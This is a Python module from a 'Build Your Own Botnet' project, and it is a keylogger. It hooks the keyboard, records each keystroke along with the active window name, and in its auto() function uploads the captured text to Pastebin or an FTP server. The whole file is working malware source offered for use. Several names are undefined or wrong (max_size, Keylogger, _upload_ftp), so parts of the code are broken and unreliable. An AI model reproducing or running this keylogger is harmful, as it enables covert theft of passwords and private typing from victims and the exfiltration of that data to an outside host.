#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import time
import Queue
import threading
import cStringIO
import collections

# modules

import util

__Keylogger_imports = ['pyHook','pythoncom','pyxhook']
_window             = None
_size               = 4000
_buffer             = cStringIO.StringIO()
results             = Queue.Queue()


def _event(event):
    try:
        if event.WindowName != vars(Keylogger)['window']:
            vars(Keylogger)['window'] = event.WindowName
            _buffer.write("\n[{}]\n".format(_window))
        if event.Ascii > 32 and event.Ascii < 127:
            _buffer.write(chr(event.Ascii))
        elif event.Ascii == 32:
            _buffer.write(' ')
        elif event.Ascii in (10,13):
            _buffer.write('\n')
        elif event.Ascii == 8:
            _buffer.seek(-1, 1)
            _buffer.truncate()
        else:
            pass
    except Exception as e:
        util.debug('{} error: {}'.format(event.func_name, str(e)))
    return True


def auto(mode):
    """
    Auto-upload to Pastebin or FTP server
    """
    if mode not in ('ftp','pastebin'):
        return "Error: invalid mode '{}'".format(str(mode))
    while True:
        try:
            if _buffer.tell() > max_size:
                result  = util.pastebin(_buffer) if mode == 'pastebin' else _upload_ftp(_buffer, filetype='.txt')
                results.put(result)
                _buffer.reset()
            elif globals().get('_abort'):
                break
            else:
                time.sleep(5)
        except Exception as e:
            util.debug("{} error: {}".format(auto.func_name, str(e)))
            break


def run():
    """
    Run the keylogger
    """
    while True:
        try:
            hm = pyHook.HookManager() if os.name is 'nt' else pyxhook.HookManager()
            hm.KeyDown = _event
            hm.HookKeyboard()
            pythoncom.PumpMessages() if os.name is 'nt' else time.sleep(0.1)
        except Exception as e:
            util.debug('{} error: {}'.format(run.func_name, str(e)))
            break